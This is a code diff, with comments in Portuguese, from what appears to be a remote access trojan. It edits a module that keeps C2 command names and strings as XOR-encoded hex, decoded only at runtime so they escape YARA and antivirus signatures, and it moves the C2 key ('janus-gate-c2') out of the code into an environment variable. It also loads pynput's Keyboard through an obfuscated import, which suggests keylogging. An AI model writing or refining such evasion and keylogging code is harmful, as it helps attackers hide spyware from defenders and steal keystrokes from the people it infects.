@@ -81,8 +81,21 @@ class Crypto:
 # RAT em análise estática (YARA/AV). Aqui os literais ficam em hex XOR e são
 # decifrados só em runtime, dentro de dicionários com chaves neutras (que NÃO
 # contêm a palavra proibida, já que as chaves também viram strings no bytecode).
-# A MESMA chave CMD_KEY deve ser usada no connection.py.
-CMD_KEY = "janus-gate-c2"
+# A chave CMD_KEY vem do .env (não fica no código). Sem ela, os comandos/strings
+# especiais não são decifrados (caem no fallback vazio).
+CMD_KEY = os.environ.get("CMD_KEY", "")
+
+
+def _decrypt_or(hex_value, fallback=""):
+    # Decifra um hex XOR se a chave existir; senão (ou em erro) devolve o fallback.
+    # Mesmo espírito do env_or_secret: nunca derruba a importação por chave ausente.
+    if not CMD_KEY:
+        return fallback
+    try:
+        return Crypto.decrypt_string(hex_value, CMD_KEY)
+    except (ValueError, UnicodeDecodeError):
+        return fallback
+
 
 _COMMANDS_HEX = {
     "START":          "450a0b0c1f42004107114c1146",
@@ -107,8 +120,8 @@ _STRINGS_HEX = {
     "set_value":       "39041a2312411204311d",
 }
 
-COMMANDS = {name: Crypto.decrypt_string(value, CMD_KEY) for name, value in _COMMANDS_HEX.items()}
-STRINGS = {name: Crypto.decrypt_string(value, CMD_KEY) for name, value in _STRINGS_HEX.items()}
+COMMANDS = {name: _decrypt_or(value) for name, value in _COMMANDS_HEX.items()}
+STRINGS = {name: _decrypt_or(value) for name, value in _STRINGS_HEX.items()}
 
 # from pynput import Keyboard -> submódulo ofuscado também
 Keyboard = importlib.import_module(STRINGS["kbd_mod"])
